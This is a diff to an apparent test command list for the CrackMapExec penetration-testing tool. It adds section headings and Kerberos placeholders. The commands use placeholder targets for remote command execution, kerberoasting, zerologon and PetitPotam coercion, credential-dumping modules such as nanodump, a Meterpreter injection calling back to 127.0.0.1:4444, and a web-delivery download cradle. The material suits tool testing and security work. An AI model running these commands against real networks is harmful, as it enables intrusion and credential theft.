@@ -1,3 +1,4 @@
+##### SMB
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --shares
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --shares --filter-shares READ WRITE
@@ -20,6 +21,7 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -x whoami
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -X whoami
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -X whoami --obfs
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS --wmi "os get"
+##### SMB Modules
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M bh_owned
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M dfscoerce
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M drop-sc
@@ -58,7 +60,7 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdcman
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp --options
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disable
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M reg-query
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M reg-query -o PATH=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion KEY=DevicePath
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M runasppl
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M scuffy -o SERVER=127.0.0.1 NAME=test
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce
@@ -122,8 +124,10 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M veeam --options
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M wifi --options
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M winscp --options
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M zerologon --options
+##### SMB Anonymous Auth
 crackmapexec smb TARGET -u '' -p '' -M zerologon
 crackmapexec smb TARGET -u '' -p '' -M petitpotam
+##### LDAP
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --users
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --groups
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --get-sid
@@ -132,6 +136,7 @@ crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --kerberoasting /tmp/o
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --trusted-for-delegation
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --admin-count
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS --gmsa
+##### LDAP Modules
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M adcs
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M adcs --options
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M daclread
@@ -154,18 +159,27 @@ crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M user-desc
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M user-desc --options
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M whoami
 crackmapexec ldap TARGET -u USERNAME -p PASSWORD KERBEROS -M whoami --options
-crackmapexec winrm TARGET -u USERNAME -p PASSWORD
-crackmapexec winrm TARGET -u USERNAME -p PASSWORD -X whoami
-crackmapexec winrm TARGET -u USERNAME -p PASSWORD --laps
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD
+##### WINRM
+crackmapexec winrm TARGET -u USERNAME -p PASSWORD KERBEROS
+crackmapexec winrm TARGET -u USERNAME -p PASSWORD KERBEROS -X whoami
+crackmapexec winrm TARGET -u USERNAME -p PASSWORD KERBEROS --laps
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS
+##### MSSQL
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS
+##### MSSQL Modules
 # crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M empire_exec
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M met_inject --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M mssql_priv
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M mssql_priv --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M nanodump
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M nanodump --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M test_connection --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M test_connection -o HOST=localhost
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M web_delivery --options
-crackmapexec mssql TARGET -u USERNAME -p PASSWORD -M web_delivery -o URL=localhost/dl_cradle
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M mssql_priv
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M mssql_priv --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M nanodump
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M nanodump --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M test_connection --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M test_connection -o HOST=localhost
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M web_delivery --options
+crackmapexec mssql TARGET -u USERNAME -p PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle
+# a bit janky, but we try to enable RDP before testing RDP
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
+##### RDP
+crackmapexec rdp TARGET -u USERNAME -p PASSWORD KERBEROS
+crackmapexec rdp TARGET -u USERNAME -p PASSWORD KERBEROS --nla-screenshot
